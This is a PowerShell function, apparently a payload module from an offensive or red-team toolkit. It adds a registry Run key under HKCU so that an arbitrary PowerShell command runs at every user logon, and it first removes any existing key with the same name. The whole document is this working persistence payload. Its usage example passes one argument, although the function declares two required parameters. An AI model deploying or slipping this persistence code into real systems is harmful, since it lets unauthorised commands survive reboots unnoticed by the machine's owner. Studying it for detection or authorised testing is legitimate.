function Test-Add-Persistence-Command
{
<#
.SYNOPSIS
Custom Payload to add a registry key under HKCU to execute a PowerShell command.

.DESCRIPTION
This payload adds a registry key under HKCU to execute a PowerShell command.

.PARAMETER RKEY_NAME
The RKEY_NAME defines the Registry key name.

.PARAMETER PWS_COMMAND
The PWS_COMMAND defines the PowerShell command to be executed.

.EXAMPLE
PS > Test-Add-Persistence-Command "calc"

#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RKEY_NAME,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $PWS_COMMAND
    )
    
    $pwsCommandForm = "powershell -c `"&{$PWS_COMMAND}`""
    $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
    
    # Check if it already exists a key with the given name
    if($runKeys.$RKEY_NAME){
        # Remove it if already exists
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME
    }
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $RKEY_NAME -Value $pwsCommandForm
}